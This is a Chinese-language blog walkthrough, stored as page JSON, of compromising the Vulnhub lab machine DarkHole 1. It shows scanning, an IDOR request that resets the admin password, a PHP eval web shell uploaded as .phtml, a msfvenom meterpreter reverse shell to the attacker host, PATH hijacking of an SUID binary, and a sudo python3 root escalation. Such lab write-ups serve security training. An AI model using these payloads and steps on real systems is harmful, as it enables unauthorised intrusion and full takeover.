{"pageProps":{"postData":{"id":"VulnhubDarkHole 1","contentHtml":"<h1>DarkHole: 1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/darkhole-1,724/\">https://www.vulnhub.com/entry/darkhole-1,724/</a></p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>184</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 09:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 09:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0011</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 09:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0022</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">2</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">41</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-08 <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">00</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-csrf: \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|       httponly flag not set\n|   /login.php: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n| http-enum: \n|   /login.php: Possible admin folder\n|   /config/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|   /css/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|   /js/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|_  /upload/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，存在登录页面链接</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image69.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>先扫描目录看看</p>\n<pre><code class=\"hljs language-python\">dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span> \n//\n[<span class=\"hljs-number\">10</span>:07:<span class=\"hljs-number\">48</span>] Starting:                                                                                                                                         \n[<span class=\"hljs-number\">10</span>:07:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">301</span> -  313B  - /js  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/js/                \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">301</span> -  317B  - /config  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/config/        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">200</span> -  460B  - /config/                                          \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">11</span>] <span class=\"hljs-number\">301</span> -  314B  - /css  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/css/              \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">12</span>] <span class=\"hljs-number\">200</span> -   21B  - /dashboard.php                                    \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">200</span> -  487B  - /js/                                              \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">200</span> -    1KB - /login.php                                        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">24</span>] <span class=\"hljs-number\">302</span> -    0B  - /logout.php  ->  login.php                        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">200</span> -    1KB - /register.php                                     \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">301</span> -  317B  - /upload  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/upload/        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -  456B  - /upload/       \n</code></pre>\n<ul>\n<li><code>/dashboard.php</code>  无权限</li>\n<li><code>/upload</code> 上传文件夹</li>\n<li><code>/config</code> 存在database.php</li>\n</ul>\n</li>\n<li>\n<p>登陆页面存在注册，我们注册用户<code>test</code>登录</p>\n<p>进去后发现可以<code>update</code>信息以及更改密码，感觉会存在注入</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image70.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>测试是否存在注入</p>\n<ul>\n<li>\n<p><code>Details Update</code> 部分</p>\n<p>使用<code>sql</code>测试没找到注入点</p>\n</li>\n<li>\n<p><code>Password Change</code> 部分</p>\n<p>这部分没注入….但是修改密码区域可以抓包将传入的<code>id</code>值修改，我们可以将其修改为<code>id=1</code>的用户（可能是管理用户）</p>\n<pre><code class=\"hljs language-python\">POST /dashboard.php?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">2</span> HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">132.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">132.0</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span>\nAccept-Language: zh-CN,zh;q=<span class=\"hljs-number\">0.8</span>,zh-TW;q=<span class=\"hljs-number\">0.7</span>,zh-HK;q=<span class=\"hljs-number\">0.5</span>,en-US;q=<span class=\"hljs-number\">0.3</span>,en;q=<span class=\"hljs-number\">0.2</span>\nAccept-Encoding: gzip, deflate, br\nContent-<span class=\"hljs-type\">Type</span>: application/x-www-form-urlencoded\nContent-Length: <span class=\"hljs-number\">20</span>\nOrigin: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nSec-GPC: <span class=\"hljs-number\">1</span>\nConnection: keep-alive\nReferer: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/dashboard.php?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">2</span>\nCookie: PHPSESSID=aal4svnq3poomufcq5sv2lo2fu\nUpgrade-Insecure-Requests: <span class=\"hljs-number\">1</span>\nPriority: u=<span class=\"hljs-number\">0</span>, i\n\npassword=<span class=\"hljs-number\">123456</span>&#x26;<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span>\n</code></pre>\n<p>成功将包发送，提示<code>Password has been change</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>登陆后台，用户名使用<code>admin</code> ，密码是用修改后的<code>123456</code> ，成功进入</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image71.png\" alt=\"image.png\"></p>\n<p>多了个上传文件框</p>\n</li>\n<li>\n<p>尝试文件上传上传🐎</p>\n<ul>\n<li>\n<p>直接上传<code>2.php</code> ，内容是一句马，提示：<code>Sorry , Allow Ex : jpg,png,gif</code> 看着像是白名单</p>\n</li>\n<li>\n<p>尝试了一下，不只是可以上传<code>jpg,png,gif</code> ，也可以上传别的后缀文件，所以更像是把<code>php</code>类的文件后缀放进黑名单了</p>\n</li>\n<li>\n<p>这里涉及到一些文件上传<code>CTF</code>的套路，我们将<code>php</code>改为其他可以解释为<code>php</code>文件的后缀，我将其修改为<code>phtml</code> ，上传成功（我是抓包后修改的，也可以直接修改文件后缀然后直接上传）</p>\n<pre><code class=\"hljs language-python\">Content-Disposition: form-data; name=<span class=\"hljs-string\">\"fileToUpload\"</span>; filename=<span class=\"hljs-string\">\"2.phtml\"</span>\nContent-<span class=\"hljs-type\">Type</span>: application/octet-stream\n\n&#x3C;?php @<span class=\"hljs-built_in\">eval</span>($_POST[x]); ?>\n</code></pre>\n</li>\n<li>\n<p>上传的文件保存在了<code>/upload</code>路径，测试能否使用</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image72.png\" alt=\"image.png\"></p>\n<p>可以正常包含</p>\n</li>\n</ul>\n</li>\n<li>\n<p>使用蚁🗡连接</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image73.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>我们先反弹<code>shell</code> ，靶机自带的<code>nc</code>不支持<code>-e</code> ,所以我们需要上传反弹<code>shell</code>脚本然后包含</p>\n<ul>\n<li>\n<p>生成脚本</p>\n<pre><code class=\"hljs language-python\">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> lport=<span class=\"hljs-number\">1234</span> -f raw > getshell.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: php <span class=\"hljs-keyword\">from</span> the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">1115</span> <span class=\"hljs-built_in\">bytes</span>\n</code></pre>\n</li>\n<li>\n<p>在蚁🗡将脚本上传<code>upload</code>文件夹里</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image74.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>kali</code>打开<code>msf</code>监听</p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload php/meterpreter/reverse_tcp\npayload => php/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>\nlhost => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>\nlport => <span class=\"hljs-number\">1234</span>\nmsf6 exploit(multi/handler) > run\n</code></pre>\n</li>\n<li>\n<p>网页访问上传的脚本文件</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image75.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>获得<code>shell</code></p>\n<pre><code class=\"hljs language-python\">[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> \n[*] Sending stage (<span class=\"hljs-number\">39927</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\n[*] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>:<span class=\"hljs-number\">55480</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-08 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">49</span>:08 +0800\n\nmeterpreter > \n</code></pre>\n<p>输入shell获得shell命令行</p>\n</li>\n</ul>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ whoami\nwww-data\n$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n$ uname -a\nLinux darkhole <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">77</span>-generic <span class=\"hljs-comment\">#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找利用点</p>\n<ul>\n<li>\n<p>SUID权限</p>\n<pre><code class=\"hljs language-python\">$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/<span class=\"hljs-built_in\">bin</span>/su\n/usr/<span class=\"hljs-built_in\">bin</span>/at\n/usr/<span class=\"hljs-built_in\">bin</span>/umount\n/usr/<span class=\"hljs-built_in\">bin</span>/pkexec\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/fusermount\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/mount\n/home/john/toto\n</code></pre>\n<p><code>/home/john/toto</code> 这个一看就不对劲</p>\n</li>\n<li>\n<p>数据库配置文件</p>\n<pre><code class=\"hljs language-python\">$ cat database.php\n&#x3C;?php\n$connect = new mysqli(<span class=\"hljs-string\">\"localhost\"</span>,<span class=\"hljs-string\">'john'</span>,<span class=\"hljs-string\">'john'</span>,<span class=\"hljs-string\">'darkhole'</span>);\n</code></pre>\n<p>可以尝试密码碰撞<code>ssh</code>，但是密码错误</p>\n</li>\n</ul>\n</li>\n<li>\n<p>来到<code>/home/john/</code> ，下有四个文件</p>\n<pre><code class=\"hljs language-python\">$ ls\nfile.py\npassword\ntoto\nuser.txt\n</code></pre>\n<p>但是除了<code>toto</code>有读和执行权限，别的都没有权限，前面<code>suid</code>也搜索出了<code>toto</code> ，尝试利用</p>\n</li>\n<li>\n<p>利用<code>toto</code></p>\n<ul>\n<li>\n<p>因为不知道有什么作用，我们直接执行</p>\n<pre><code class=\"hljs language-python\">$ ./toto\nuid=<span class=\"hljs-number\">1001</span>(john) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n</code></pre>\n</li>\n<li>\n<p>我们通过蚁🗡下载该文件下来，使用<code>IDA</code>反编译看看写了啥</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> __fastcall main(<span class=\"hljs-built_in\">int</span> argc, const char **argv, const char **envp)\n{\n  setuid(0x3E9u);\n  setgid(0x3E9u);\n  <span class=\"hljs-keyword\">return</span> system(<span class=\"hljs-string\">\"id\"</span>);\n}\n</code></pre>\n<p>设置<code>UID</code>然后设置<code>GID</code>最后输出<code>ID</code>命令</p>\n</li>\n<li>\n<p>劫持环境变量</p>\n<p>因为他会执行<code>id</code> ，所以我们修改环境变量让他执行id的时候执行<code>/bin/bash</code></p>\n<pre><code class=\"hljs language-python\">$ echo <span class=\"hljs-string\">\"/bin/bash\"</span> > /tmp/<span class=\"hljs-built_in\">id</span>\n$ chmod <span class=\"hljs-number\">777</span> /tmp/<span class=\"hljs-built_in\">id</span>\n$ export PATH=/tmp:$PATH \n</code></pre>\n<p><code>$ export PATH=/tmp:PATH</code>  设置<code>/tmp</code>为环境变量的开头，那样就可以一开始就去<code>/tmp</code>寻找 <code>id</code> 也就是<code>/bin/bash</code></p>\n<p>执行<code>toto</code> ，获得<code>john</code>的shell</p>\n<pre><code class=\"hljs language-python\">$ ./toto\njohn@darkhole:/home/john$\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>获得<code>john</code>的用户后查看之前没权限看的文件</p>\n<ul>\n<li>\n<p><code>password</code> 是<code>john</code>的密码，我们用它去<code>ssh</code>登录<code>john</code>获得更好的用户交互<code>shell</code></p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ cat password \nroot123\n</code></pre>\n</li>\n<li>\n<p><code>file.py</code>是空的</p>\n<pre><code class=\"hljs language-python\">ohn@darkhole:~$ cat file.py \n\n</code></pre>\n</li>\n<li>\n<p><code>user.txt</code> 一个<code>flag</code></p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ cat user.txt \nDarkHole{You_Can_DO_It}\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>寻找利用点</p>\n<ul>\n<li>\n<p>查看<code>sudo</code>权限</p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> john: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> john on darkhole:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser john may run the following commands on darkhole:\n    (root) /usr/<span class=\"hljs-built_in\">bin</span>/python3 /home/john/file.py\n</code></pre>\n<p>可以使用<code>root</code>权限执行<code>file.py</code>文件，哦豁，可以提权了</p>\n</li>\n<li>\n<p>编辑<code>file.py</code>文件，将提权语句写入<code>file.py</code></p>\n<pre><code class=\"hljs language-python\">ehco <span class=\"hljs-string\">\"import os;os.system('/bin/bash');\"</span> >> file.py\n</code></pre>\n</li>\n<li>\n<p>使用<code>sudo</code>权限执行</p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ sudo /usr/<span class=\"hljs-built_in\">bin</span>/python3 /home/john/file.py \nroot@darkhole:\n</code></pre>\n<p>获得root！！！</p>\n</li>\n</ul>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\">root@darkhole:~<span class=\"hljs-comment\"># cat root.txt </span>\nDarkHole{You_Are_Legend}\n</code></pre>\n</li>\n</ol>","title":"Vulnhub - DarkHole 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DarkHole: 1\n\n https://www.vulnhub.com/entry/darkhole-1,724/\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`184`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1...."},"recentPosts":[{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"}]},"__N_SSG":true}